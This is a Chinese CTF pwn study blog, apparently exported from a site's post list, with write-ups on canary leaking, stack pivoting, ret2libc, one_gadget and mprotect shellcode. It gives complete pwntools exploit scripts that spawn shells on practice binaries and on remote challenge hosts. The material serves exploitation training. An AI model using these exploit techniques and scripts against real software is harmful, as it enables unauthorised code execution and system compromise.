收获canary接收假设我们现在要泄露的 Canary 值是 0x1122334455667700。 步骤一：内存中的原始状态 在程序运行的内存中，这个 Canary 值以小端序存储。这意味着它的字节顺序是反过来的。 内存地址 (低) -&gt; Canary 字节序 (高) \\x00\\x77\\x66\\x55\\x44\\x33\\x22\\x11 ，Canary 的最低字节是 \\x00，存储在最低地址。 步骤二：构造并发送第一个 Payload (泄露) 我们构造 Payload：b’a’ * 0x48 + b’b’。 程序接收后，缓冲区被填满，b’b’ 覆盖了 Canary 的最低字节 \\x00。 现在，内存中的 Canary 变成了： \\x62\\x77\\x66\\x55\\x44\\x33\\x22\\x11，\\x62 是字符 ‘b’ 的十六进制值。 步骤三：程序输出泄露的数据 程序使用 printf(“%s”, buf) 这样的方式将栈上的数据当成字符串输出。它会从 buf 开始向后打印，直到遇到第一个空字节 \\x00。 由于我们用 b 覆盖了 Canary 的最低字节，printf 不会在这里停止，而是继续向后打印。 它会打印出 b 加上 Canary 剩下的 7 个字节：\\x62\\x77\\x66\\x55\\x44\\x33\\x22\\x11 步骤四：脚本接收并处理泄露数据 我们的 Python 脚本执行 p.recvuntil(b’b’)，先接收到 b，然后执行 p.recv(7)，接收剩下的 7 个字节\\x77\\x66\\x55\\x44\\x33\\x22\\x11 接下来，我们用 rjust(8, b’\\x00’) 来恢复 Canary，就canary的小端序情况来看，在数据左侧添一个”\\x00”,所以要用rjust（把现有数据放右边） 最后，我们用 u64() 将这个完整的 8 字节小端序数据转换回一个整数： canary &#x3D; u64(b’\\x00\\x77\\x66\\x55\\x44\\x33\\x22\\x11’)结果就是：0x1122334455667700 至此，Canary 泄露完成。 小端序12leaked = p.recv(8) # 收到 8 字节：b&#x27;\\x00\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde&#x27;value = u64(leaked) # → 0xdebc9a7856341200 12target_addr = 0x401123p.send(p64(target_addr)) # → 发送 b&#x27;\\x23\\x11\\x40\\x00\\x00\\x00\\x00\\x00&#x27; 从内存读整数（canary、地址） ✅ 是 用u32&#x2F;u64 向内存写整数（ROP、溢出） ✅ 是 用p32&#x2F;p64 字符串（”hello”） ❌ 否 按正常顺序 网络协议 ❌ 否（用大端） 用&gt;I,&gt;Q 文件格式（ELF、PNG） ❌ 否 按字节流顺序 格式化字符串输出（%p） ❌ 否 直接转整数 泄露的 hex 字符串（如 “aabbccdd”） ❌ 否 先bytes.fromhex()再看是否要反转","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"Canary绕过","slug":"Canary绕过","permalink":"http://example.com/tags/Canary%E7%BB%95%E8%BF%87/"},{"name":"小端序","slug":"小端序","permalink":"http://example.com/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"gyctf_2020_borrowstack","slug":"gyctf-2020-borrowstack","date":"2025-07-29T02:28:09.000Z","updated":"2025-09-03T10:56:04.264Z","comments":true,"path":"2025/07/29/gyctf-2020-borrowstack/","permalink":"http://example.com/2025/07/29/gyctf-2020-borrowstack/","excerpt":"","text":"题目 思路： bank是bss段上的，栈空间不足,把泄露libc的东西放在bank上，通过buf跳转到bank泄露libc去找到libc基址 然后加上对应libc的one_gadget偏移，跳转过去执行ong_gadgat就可以了 脚本12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *#p=process(&quot;./gyctf_2020_borrowstack&quot;)p=remote(&quot;node5.buuoj.cn&quot;,27049)elf=ELF(&quot;./gyctf_2020_borrowstack&quot;)bank=0x0000000000601080leave=0x400699rdi=0x0400703ret=0x4004c9puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]main=0x400626payload1=b&#x27;a&#x27;*0x60+p64(bank)+p64(leave)p.recvuntil(b&quot;want&quot;)p.send(payload1)p.recvuntil(b&quot;now!&quot;)payload2=p64(ret)*20+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.send(payload2)a=p.recvline()puts= u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(puts))libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)one=libc_base+0x4526apayload=b&#x27;a&#x27;*0x68+p64(one)p.sendline(payload)p.interactive() 收获p64(ret)*0x20原因当 main 函数再次被执行时（因为你的 ROP 链最后跳转到了 main 函数的地址）： 程序会为新的 main 函数调用重新分配一个栈帧。 在这个新的栈帧中，会再次为局部变量 buf[96] 分配空间。 为什么“临时变量的空间会覆盖到 GOT 表”？ 这里就是关键点。在 64 位程序中，栈是向下增长的（从高地址向低地址）。 GOT 表通常在程序的低地址区域。 （例如：0x0601018） bank 变量在 .bss 段，通常地址比 GOT 表高。 （例如：0x0601080） 栈会向下增长。 当 main 函数再次被调用，并且它在堆栈上分配 buf 等局部变量时，这些变量会占用 rsp 向下增长的内存空间。 现在想象一下： 你的栈迁移，把 rsp 设置到了 bank 处（例如 0x0601080）。 你用 p64(ret)*20 把你的 ROP 链推到了 bank + 160 (例如 0x0601120)。 你的 ROP 链执行，泄漏 puts 地址。 然后，你的 ROP 链最后执行 p64(main)，导致程序跳转回 main 函数的开头。 当 main 函数再次执行时，它会在栈上重新分配空间。 此时，新的栈帧可能会从 rsp 的当前位置（即 0x0601120，也就是你的 ROP 链最后执行完的位置）开始向下（向低地址）增长。 如果 main 函数分配的局部变量（例如 buf[96]）的新空间，在栈向下增长的过程中，恰好“覆盖”到了 GOT 表所在的内存区域（例如 0x0601018），那么 GOT 表的地址就会被这些局部变量的垃圾数据所破坏。 p64(ret)*20 的作用 所以，p64(ret)*20 在这里的另一个重要作用就是： 它将你的伪造栈帧（即你写入 bank 的 ROP 链）向高地址方向推得更远。 这样，当 main 函数再次被调用时，它会从你伪造栈的末尾（bank + 160 + ROP 链长度）开始向下分配新的栈帧。 通过把你的伪造栈（和 rsp 的位置）设置在足够高的地址，可以确保 main 函数再次分配的局部变量空间（栈向下增长的部分）不会侵犯到位于低地址的 GOT 表。 用图示来说明： 没有 p64(ret)\\*20 的风险： 1234567891011121314高地址...0x0601080 &lt;-- bank (rsp 迁移到这里)| pop_rdi || puts_got| &lt;-- ROP链| puts_plt|| main |...0x0601018 &lt;-- puts_got (GOT表)...低地址当 main 再次运行，它可能从 0x0601080 附近向下分配新的 buf 空间，这个 buf 空间可能直接覆盖到 0x0601018 处的 puts_got。 有了 p64(ret)\\*20 的好处： 1234567891011121314151617181920高地址...0x0601120 &lt;-- bank + 160 (rsp 最终会到这里)| pop_rdi || puts_got| &lt;-- ROP链| puts_plt|| main |...0x0601080 &lt;-- bank (rsp 最初迁移到这里，p64(ret)*20 填充)| ret || ... || ret |...0x0601018 &lt;-- puts_got (GOT表)...低地址当 main 再次运行，它会从 0x0601120 附近向下分配新的 buf 空间。由于 0x0601120 足够高，向下分配的 buf 空间不会到达 0x0601018 的 puts_got。GOT表因此被保护了。 所以，这段解释指的是：p64(ret)\\*20 能够将你的 ROP 链的“起点”抬高，从而避免当程序再次回到 main 函数并重新分配栈空间时，main 函数的局部变量（如 buf）在栈向下增长时，其空间与 GOT 表发生重叠，进而破坏 GOT 表。 这是一种非常常见的，也是非常重要的防御性策略，确保了后续攻击（例如获取 Shell）的可靠性，因为这些攻击通常需要一个完好无损的 GOT 表来解析函数地址。 大小1.可以从一个小数开始尝试（推荐） 一般情况下20就够了 不能太大， read(0, &amp;bank, 0x100uLL) 写入的。这个 read 函数最多只能读取 0x100 (256) 字节。 你的 payload 长度是有限制的。 p64(ret)*N 占据的字节数是 N * 8。 你的核心 ROP 链 (p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)) 本身也需要空间。 p64(pop_rdi): 8 字节 p64(puts_got): 8 字节 p64(puts_plt): 8 字节 p64(main): 8 字节 核心 ROP 链共 4 * 8 = 32 字节。 如果 N 过大，例如 N=100，那么 p64(ret)*100 就需要 100 * 8 = 800 字节。这已经远远超过了 read 函数能读取的最大 0x100 (256) 字节。 one_gadget和LibcSearcherone_gadget 是一个命令行工具，它用于分析 libc 库文件，并找到其中可以直接用于获取 shell 的指令序列的偏移量。 与传统的 system(&quot;/bin/sh&quot;) 方法相比，one_gadget 通常更简洁，因为它只需要一个地址就能获取 shell，而不需要 pop_rdi gadget、&quot;/bin/sh&quot; 字符串的地址和 system 函数的地址。 此外，one_gadget 通常对环境（包括栈对齐）的要求更宽松。 用法和shellcode一样 找到位置即可ibc 把泄露出来的函数地址在libc网站匹配 之后下载匹配的的libc版本 用命令 1one_gadget /home/p0ach1l/Documents/libc6_2.23-0ubuntu11_amd64.so 找到合适的偏移量即可（地址下面是它要满足的条件） LibcSearcher 匹配的版本是它自己数据库中的版本，而不是你本地计算机上 /lib/x86_64-linux-gnu/libc.so.6 这样的文件。 123system=libc_base+libc.dump(&#x27;system&#x27;)binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system) 是用它LibcSearcher匹配的版本，而one_gadget是用我们匹配下载的libc文件去实际计算的，更准确 system(&quot;/bin/sh&quot;) 的失败： system(&quot;/bin/sh&quot;) 方法需要计算 system 函数的地址 (libc_base + libc.dump(&#39;system&#39;)) 和 &quot;/bin/sh&quot; 字符串的地址 (libc_base + libc.dump(&#39;str_bin_sh&#39;))。 如果这种方法失败，最核心的原因是 LibcSearcher 为你选定的那个 libc 版本（例如 libc6_2.23-0ubuntu10_amd64），虽然其 puts 偏移和 one_gadget 的特定偏移与远程服务器相符，但其内部记录的 system 函数和 &quot;/bin/sh&quot; 字符串的相对偏移量，与远程服务器实际 libc 中的这两个偏移量不一致**。 libc 版本号（如 2.23）可能相同，但不同的发行版或编译选项（如 ubuntu10 vs ubuntu11，或不同的构建日期）会导致内部函数和字符串的具体相对位置存在细微差异。即使 puts 和某个 one_gadget 的偏移恰好相同，system 或 &quot;/bin/sh&quot; 的偏移可能就不同了。 当你用错误的偏移量计算出 system 和 &quot;/bin/sh&quot; 的地址并尝试跳转时，程序会因为 RIP 指向无效地址或 system 函数接收到无效参数而崩溃（dumped core）。","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"one_gadget","slug":"one-gadget","permalink":"http://example.com/tags/one-gadget/"},{"name":"栈迁移","slug":"栈迁移","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"pwn49","slug":"pwn49","date":"2025-07-26T08:00:42.000Z","updated":"2025-09-03T10:56:46.250Z","comments":true,"path":"2025/07/26/pwn49/","permalink":"http://example.com/2025/07/26/pwn49/","excerpt":"","text":"题目 看出是静态编译，考虑用mprotect来修改它的权限 ctrl+s查看bss段，找要修改的范围 因为mprotect的地址选择的限制条件 我们把页面边界定为0x80DA000 接着就可以构造payload了 先调用mprotect函数修改权限，再用read函数把后门函数读入这个位置 之后控制返回地址让程序回到这个地方执行后门函数 脚本12345678910111213141516171819from pwn import *#p=process(&quot;./pwn49&quot;)context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#gdb.attach(p,&quot;b*0x0000000000400737&quot;)p=remote( &quot;pwn.challenge.ctf.show&quot;,28242)elf=ELF(&quot;./pwn49&quot;)edx_ecx_ebx=0x08056194mprotect=0x0806cdd0start=0x80DA000read=elf.sym[&quot;read&quot;]payload=b&#x27;a&#x27;*(0x12+4)+p32(mprotect)payload += p32(edx_ecx_ebx) + p32(start) + p32(1000) + p32(7)payload+=p32(read)+p32(edx_ecx_ebx)+p32(0)+p32(start)+p32(1000)+p32(start)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive() （找pop_ret时只需要控制是pop了那三个寄存器就可以） mprotect mprotect 系统调用有严格的页面对齐要求： 起始地址必须是页面边界（4KB个字节的倍数）（4KB&#x3D;1000字节) 长度会被向上舍入到页面边界 区间长度 len 必须是页大小的整数倍 假设你的 BSS 段开始于 0x80DB320,len长度为1000： 内存布局： 1234567891011121314150x80DA000 ┌─────────────────┐ ← 页面边界（4KB对齐）​ │ 页面1 │​ │ │0x80DB320 ┌─────────────────┐ ← BSS段开始​ │ BSS段 │​ │ │0x80DBFFF └─────────────────┘ ← 页面1结束0x80DC000 ┌─────────────────┐ ← 下一个页面边界","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"mprotect","slug":"mprotect","permalink":"http://example.com/tags/mprotect/"},{"name":"静态编译","slug":"静态编译","permalink":"http://example.com/tags/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"ciscn_2019_es_2","slug":"ciscn-2019-es-2","date":"2025-07-24T09:05:12.000Z","updated":"2025-09-03T10:55:35.047Z","comments":true,"path":"2025/07/24/ciscn-2019-es-2/","permalink":"http://example.com/2025/07/24/ciscn-2019-es-2/","excerpt":"","text":"题目 很明显的栈溢出漏洞，但是可操作空间太小，只能覆盖到ret，所以要用栈迁移 有system函数，但是需要自己传参，可以把&#x2F;bin&#x2F;sh字符段放在栈上 有两次输入，第一次输入可以用来泄露ebp的地址 第二次要根据泄露地址去找加上偏移得到s的头部，在那里构造我们的后门函数，之后通过ret返回s头部执行这个后门函数。 先查看ebp距离s的实际距离（gdb动态调试查看） 相距0xffffcf18 - 0xffffcee0 &#x3D; 0x38 不能直接通过下面这种方式查看，因为现在的操作系统默认开启了ASLR，所以栈上的地址一直会变化 接着构造我们的后门函数 且因为跳转到s后还要执行，所以程序不能崩溃 ，如果s可以直接跳转到后门函数就可以直接把地址写在ret上 123payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave) payload.ljust(0x28, b&#39;\\x00&#39;) 中必须使用 b&#39;\\x00&#39; 因为printf会在接下来的数据中找符合%s的数据，如果没有”&#x2F;x00”，他可能去读取继续往后读到栈上的数据，%s时字符串，printf读到不可打印的字符会引发错误 leave ret解释 leave mov esp, ebp:把esp移动到ebp-0x38的位置（ebp-0x38)其实就是aaaa的位置 pop ebp：把aaaa这一块pop出去了 ret pop eip:,把栈顶的system函数pop出去作为返回地址 脚本1234567891011121314151617181920from pwn import *#p=process(&quot;./ciscn_2019_es_2&quot;)p=remote(&quot;node5.buuoj.cn&quot;,25671)sys=0x08048400main=0xdeadbeefleave=0x080485FDp.recvuntil(b&quot;name?\\n&quot;)payload=b&quot;a&quot;*0x27+b&quot;b&quot;p.send(payload)p.recvuntil(b&quot;b&quot;)s=u32(p.recv(4))-0x38print(hex(s))payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave)p.sendline(payload)p.interactive() 收获栈空间识别 123偏移量 │ 寄存器/标识符 | 地址 | 内容 &lt;-- 解释-------+------------------------------------------00:0000│ esp 0xffffced0 —▸ 0x80486ca ◂— dec eax /* &#x27;Hello, %s\\n&#x27; */ 0xffffced0: ESP 寄存器当前指向的内存地址。 —▸ 0x80486ca: ESP 指向的内存地址里存储的值，它又是一个地址，指向了 0x80486ca。 ◂— dec eax /\\* &#39;Hello, %s\\n&#39; \\*/: 对 0x80486ca 这个地址的反汇编&#x2F;注释，这里显示它是一条指令的起始，并且其附近有字符串 “Hello, %s\\n”。 要找到存放内容是111111的位置，就是11111直接指向的位置0xffffcee0 esp与s的距离一直疑惑不是相距0x28吗，为什么要看这个0x38,看了很多大佬的wp也没有说的，查了才知道还要考虑堆栈平衡:joy: 🧠 关键点在于： 1char s[0x28]; 这个数组虽然是 0x28 字节，但 它不是从 ebp - 0x28 到 ebp，而是从 ebp - 0x2c 到 ebp - 4。 也就是说，编译器会： 为变量 s[0x28] 分配 0x28 字节； 还会额外分配 对齐空间（padding），使整个栈帧是对齐的； 所以，真正变量起始地址是 ebp - 0x2c，不是 ebp - 0x28。 👉 在 32 位程序中，变量 char s[0x28] 通常从 ebp - 0x2c 开始，而不是 ebp - 0x28。 在 32 位程序里，esp 在建立栈帧时，常常是 为了给局部变量和返回地址对齐到 16 字节，因此会多分配几个字节； 所以 sub esp, 0x2c 是非常常见的； 即使变量只有 0x28 字节，编译器会额外多给 4 字节 padding，形成 0x2c。 在这里也可以看到它开辟了不止0x28个空间，所以才要gdb调试看它实际的 1234567891011121314151617181920212223242526272829303132333435 高地址 (栈底，向高地址增长) ^ |+-----------------+-------------------+| 函数参数 | |+-----------------+-------------------+| 返回地址 | | (调用 func() 后返回到这里的地址)+-----------------+-------------------+| 保存的旧 EBP | (OLD_SAVED_EBP) | &lt;- (0x080485FD - leave; ret 处的 EBP 值)+-----------------+-------------------+| Padding | (通常是 4 字节) | &lt;- (如果你说 s 从 ebp - 0x2c 开始，那么这部分是 ebp-0x2c 到 ebp-0x28 之间的填充)+-----------------+-------------------+ &lt;- **ebp - 0x28**| | || | || | || | || | || char s[0x28] | || | || | || | || | || | || | |+-----------------+-------------------+ &lt;- **ebp - 0x2c** (数组 s 的起始地址)| 其他局部变量 | || （如果有） | |+-----------------+-------------------+| ...... | |+-----------------+-------------------+| 当前 ESP | | &lt;- (ESP 寄存器指向的地址)+-----------------+-------------------+ | v 低地址 (栈顶，向低地址增长)","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"栈溢出进阶","slug":"栈溢出进阶","date":"2025-07-23T06:16:44.000Z","updated":"2025-08-26T09:08:34.962Z","comments":true,"path":"2025/07/23/栈溢出进阶/","permalink":"http://example.com/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/","excerpt":"","text":"栈迁移change_ebp（栈劫持Demo1） 最多填充12个字节，只能覆盖到ebp 写入的magic的范围到0x0804A380～0x0804A38C 所以栈迁移 脚本1234567891011121314from pwn import *p = process(&quot;./change_ebp&quot;)gdb.attach(p,&quot;b *0x080485D3&quot;)backdoor = 0x0804850Bmagic_addr = 0x0804A380p.recvuntil(&quot;leave your name\\n&quot;)payload = &quot;junk&quot; + p32(backdoor) + p32(magic_addr)p.send(payload)p.interactive() ebp 的作用在函数调用时，ebp 用于： 定位局部变量（如 v1 位于 ebp-8）。 在函数返回时恢复调用者的栈帧（通过 leave 指令）。 典型函数尾声（leave; ret）： 12leave ; 相当于 mov esp, ebp; pop ebpret ; pop eip，跳转到返回地址 leave 会： 把 ebp 的值赋给 esp（栈指针指向 ebp）。 然后 pop ebp（恢复调用者的 ebp）。 ret 会 pop eip（跳转到返回地址）。 (1) leave 指令的执行 mov esp, ebp： 原本 ebp 指向栈帧基址，但已经被覆盖为 magic_addr（0x0804A380）。 所以 esp 现在指向 magic_addr（全局变量 magic 的地址）。 pop ebp： 从 esp（magic_addr）弹出一个值到 ebp。 如果 magic 区域没有特殊构造，这里可能不重要。 (2) ret 指令的执行 pop eip： 从 esp（magic_addr + 4）弹出一个值到 eip（程序计数器）。 关键点： magic_addr + 4 是 magic 变量的第 5-8 字节。 攻击者已经通过 read(0, &amp;magic, 0xCu) 向 magic 写入了 12 字节数据。 如果 magic + 4 处存放的是 backdoor 地址，ret 就会跳转到 backdoor！ ret2libc3(栈劫持Demo2) 在这里介绍一种新的办法，使函数可以不返回main函数 脚本12345678910111213141516171819202122232425262728293031323334353637from pwn import *p = process(&quot;./ret2libc3&quot;)gdb.attach(p,&quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]gets_plt = elf.plt[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]# ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot;pop_ebp_ret = 0x080485db# ROPgadget --binary ./ret2libc3 | grep leaveleave_ret = 0x08048448rop_addr = 0x804a800p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = &quot;a&quot; * 0x108 + &quot;junk&quot;payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)p.sendline(payload1)leak_addr = u32(p.recv(4))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = b&quot;A&quot; * 0x108 # 填充缓冲区payload2 += p32(system) # 调用 systempayload2 += p32(0) # 返回地址（不重要，因为直接拿 shell）payload2 += p32(binsh) # system 的参数p.sendline(payload2)p.interactive() 第一个paylaod1payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got) 输出gets的got表地址，方便寻找libc基址 然后p32(pop_ebp_ret)取出两个地址，一个放进ebp,一个放入eip(ret指令)，放进eip的也就是p32(gets_plt)，正好接上下一条指令继续执行。 1payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr) 调用gets的plt表，又产生了一个输入机会 1payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret) 把rop_addr - 4作为ebp，所以程序会跳转到这里 而rop_addr 的数据可以有payload2填入，精心构造即可 第二个paylaod填入了上面的返回地址，使程序进入system函数，再构造system函数的参数&#x2F;bin&#x2F;sh 就构造好了后门函数 x64的情况其实差不多，就是先传入参数 1234567891011121314151617181920212223242526272829303132333435from pwn import *p = process(&quot;./ret2libc3_x64&quot;)gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]gets_plt = elf.plt[&quot;gets&quot;]rop_addr = 0x601800# ROPgadget --binary ./ret2libc3_x64 --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x0000000000400783pop_rsp3 = 0x000000000040077d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; retp.recvuntil(&quot;ret2libc3_x64\\n&quot;)payload1 = &quot;a&quot; * 0x100 + &quot;junkjunk&quot;payload1 += p64(rdi) + p64(gets_got)payload1 += p64(puts_plt)payload1 += p64(rdi) + p64(rop_addr)payload1 += p64(gets_plt)payload1 += p64(pop_rsp3) + p64(rop_addr - 0x18)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.sendline(payload2)p.interactive() rbp_leave(栈劫持Demo3) v1存在栈溢出漏洞，但可输入的字符数太少 最多覆盖到返回地址处，无法直接rop 所以考虑用name来构造，然后用v1转过去 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import *p = process(&quot;./rbp_leave&quot;)#gdb.attach(p,&quot;b *0x000000000040073F&quot;)elf = ELF(&quot;./rbp_leave&quot;)name_addr = 0x6010A0# ROPgadget --binary ./rbp_leave --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x4007c3rsi2 = 0x4007c1pop_rsp3 = 0x4007bd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret# ROPgadget --binary ./rbp_leave | grep leaveleave_ret = 0x4006f0 # leave ; retret = 0x4006f1read_input = 0x4006C7rop_addr2 = name_addr + 0x800name = p64(ret) *20name += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;])name += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input)name += p64(pop_rsp3) + p64(rop_addr2 - 0x18)p.sendafter(b&quot;leave your name\\n&quot;,name.ljust(0x400,b&quot;\\x00&quot;))payload1 = b&quot;a&quot; * 0x100payload1 += p64(name_addr - 8)payload1 += p64(leave_ret)p.sendafter(&quot;try to break it\\n&quot;,payload1)leak_addr = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;))libc=LibcSearcher(&quot;read&quot;,leak_addr)libc_base = leak_addr - libc.dump(&quot;read&quot;)libc.address = libc_baseprint(hex(libc.address))system = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.send(payload2)p.interactive() 第一个payload12name += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;]) 调用puts函数打印read的got表地址 123name += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input) 调用read函数，read的参数比较多，所以多用了几个寄存器，把从终端输入的数据放在p64(rop_addr2)的位置上 1name += p64(pop_rsp3) + p64(rop_addr2 - 0x18) 因为p64(pop_rsp3)有三个pop指令，所以有要空出足够的距离，防止把重要数据弹出了 第二个payload填补v1 12payload1 += p64(name_addr - 8)payload1 += p64(leave_ret) p64(name_addr - 8)：覆盖 RBP 目标：将 RBP 修改为 name_addr - 8。 为什么是 name_addr - 8？ leave 指令会执行 mov rsp, rbp，因此 rsp 将指向 name_addr - 8。 接下来的 ret 会从 name_addr（即 name 的起始地址）开始执行 ROP 链。 -8 的调整：因为 leave 之后会 pop rbp，rsp 会 +8，最终指向 name_addr。 第三个payload12payload2 = p64(rdi) + p64(binsh)payload2 += p64(system) 为第一个payload提供的read输入 综上所述 通过0和2构造完整的后门函数，然后通过1进入执行这个后门函数 脚本 如何选择合适的 rop_addr2？ 方法 1：使用 name 的扩展区域 如果 name 的大小是 0x400，可以选择 name_addr + 0x400 之后的地址（如 name_addr + 0x800）。 优点：简单直接，无需额外泄露地址。 缺点：需确保 name 区域足够大（或程序允许越界写入）。 方法 2：使用 libc 中的可写段 libc 中有许多可写区域（如 __malloc_hook、__free_hook 附近）。 步骤： 泄露 libc 基址（如通过 puts(read_got)）。 计算目标地址（如 libc_base + 0x3c4b00）。 优点：稳定，适合大型 ROP 链。 缺点：需要先泄露 libc 地址。 方法 3：使用堆（Heap） 如果程序调用了 malloc，堆地址可能可预测。 步骤： 泄露堆地址（如通过 puts(malloc_got)）。 选择堆块中的空闲区域。 优点：空间大，不易冲突。 缺点：需要堆泄露。 canary保护Canary的设计思想简单高效，就是在栈溢出发生的高危区域的尾部插入一个值，当函数返回时检测Canary的值是否发生了改变，从而判断是否发生栈溢出&#x2F;缓冲区溢出。 保护原理当程序启用Canary编译后 插入Canary值 12mov rax，qword ptr fs:[0x28]mov qword ptr[rbp-8]，rax 检查 1234moV rdx,QWORD PTR [rbp-0x8]xOr rdx,QWORD PTR fs:0x28je0x4005d7&lt;main+65&gt;call 0x400460&lt;_stack_chk_fail@plt&gt; 如果检测出Canary的值被修改过，则会运行到__stack_chk_fail函数。这个函数位于glibc中，默认情况下经过ELF的延迟绑定。也就是说，stack_chk_fail是一个外部函数，当程序没有开启FULL RELRO保护时，可以被GOT劫持攻击。攻击者可以先劫持stack_chk_fail函数的GOT，再触发Canary检测报错，这时就会进入劫持的地址，这也是一种利用思路 在 Linux x86-64 架构下，Canary（也称为 stack_guard 或栈保护值）通常并不是直接存储在栈上（那样它就容易被溢出），而是存储在一个线程本地存储 (TLS) 区域中。 在 x86-64 Linux 系统中，fs 寄存器（或者 gs 寄存器）被操作系统用于指向当前线程的线程本地存储 (TLS) 区域。 GCC 编译器在编译时，会在程序启动时初始化这个 Canary 值，并将其存储在 TLS 区域的一个特定偏移量上。 对于 x86-64 Linux，这个偏移量通常是 0x28。所以，fs:0x28 指向的内存地址就是当前线程的 stack_guard（即 Canary 值）的存储位置。 而且TLS中的值由函数security_init进行初始化 最后，注意Canary最后的一个字节会被设置为0，防止类似printf（”%s”,&amp;buf）形式的函数不小心将Canary的值打印出来，所以用“\\x00”字符（在C语言中表示字符串的结尾）来做一个截断，和ASLR没有关系。 栈结构 1234[ buf (256 bytes) ] ← esp+0x00[ stack canary (4 bytes) ] ← esp+0x100[ saved ebp (4 bytes) ][ return address (4 bytes)] 对于有Canary的程序，如果考虑栈溢出攻击，主要有下面4个思路： 1）利用泄露函数泄露出Canary的值，再进行利用。 2）爆破得到Canary的值。 3）__stack_chk_fail函数泄露关键信息。 4）修改TLS中的stack_guard值。 1.leak_canary（泄露Canary值） 脚本1（printf_替代&#x2F;x00）12345678910111213141516171819from pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b *0x08048631&quot;)main=0x0804867fbin= 0x080485CCpayload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary))payload=b&#x27;\\x00&#x27;*0x100+p32(canary)payload+=p32(0)*2payload+=p32(main)payload+=p32(bin)p.send(payload)p.interactive() 